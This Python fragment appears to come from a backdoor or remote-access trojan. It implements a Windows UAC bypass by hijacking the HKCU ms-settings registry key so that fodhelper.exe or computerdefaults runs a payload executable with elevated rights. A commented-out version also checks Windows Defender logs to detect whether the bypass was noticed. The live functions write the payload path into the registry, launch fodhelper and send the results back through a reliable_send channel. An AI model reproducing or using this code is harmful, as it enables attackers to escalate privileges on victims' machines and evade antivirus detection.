# import subprocess
# import ctypes
# import sys

# def UACbypass(method: int = 1) -> bool:
#     if GetSelf()[1]:
#         execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
#         if method == 1:
#             print("method 1")
#             # execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
#             # execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
#             # log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
#             # execute("computerdefaults --nouacbypass")
#             # log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
#             # execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
#             # if log_count_after > log_count_before:
#             #     return UACbypass(method + 1)

#         elif method == 2:
#             print("method 2")
#             # execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
#             # execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
#             # log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
#             # execute("fodhelper --nouacbypass")
#             # log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
#             # execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
#             # if log_count_after > log_count_before:
#             #     return UACbypass(method + 1)
#         else:
#             return False
#         return True

# def IsAdmin() -> bool:
#     return ctypes.windll.shell32.IsUserAnAdmin() == 1

# def GetSelf() -> tuple[str, bool]:
#     print("sdfsdfsd")
#     if hasattr(sys, "frozen"):
#         return (sys.executable, True)
#     else:
#         return (__file__, False)



def priv1():
    execute = subprocess.run(['powershell', 'New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "C:\Genymobile\payload.exe" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result = execute.stdout + execute.stderr
    result = result.decode()
    reliable_send(result)

    
def priv2():
    execute1 = subprocess.run(['powershell', 'New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "C:\Genymobile\payload.exe" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result1 = execute1.stdout + execute1.stderr
    result1 = result1.decode()
    reliable_send(result1)

def priv3():
    execute2 = subprocess.run(['powershell', 'Start-Process "C:\\Windows\\System32\\fodhelper.exe"'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
    result2 = execute2.stdout + execute2.stderr
    result2 = result2.decode()
    reliable_send("CMD")
